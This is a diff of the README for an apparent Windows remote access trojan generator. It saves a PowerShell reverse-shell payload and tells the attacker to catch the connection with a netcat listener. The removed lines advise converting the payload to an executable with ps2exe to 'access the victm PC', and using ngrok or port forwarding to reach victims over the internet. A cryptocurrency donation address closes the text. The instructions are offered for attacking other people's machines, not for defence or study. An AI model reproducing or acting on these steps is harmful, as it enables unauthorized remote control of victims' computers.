@@ -40,15 +40,8 @@
     4. Your payload will be saved in /window-rat/{bypass.ps1} .
     5. In Attacker System, use netcat to get the reverse shell like below
     6. nc -lvnp {LPORT}
-    
-# Bonus Tip:
-    This tool generate powershell payload so in order to convert it into exe format
-    just use ps2exe tool and then access the victm PC. :)
-    *) More Features will be added in Future IA.
-    
-# Usage Type:
-    1. For WAN ( Use ngrok for that or any Port Forwarding method);
-    2. For LAN ( Use ur Local IP);
+
+
     
 # Donations:
    BTC Address:  3Dvzx2RKMR731VSEPXXgPyBq6Ln4JJdYPD
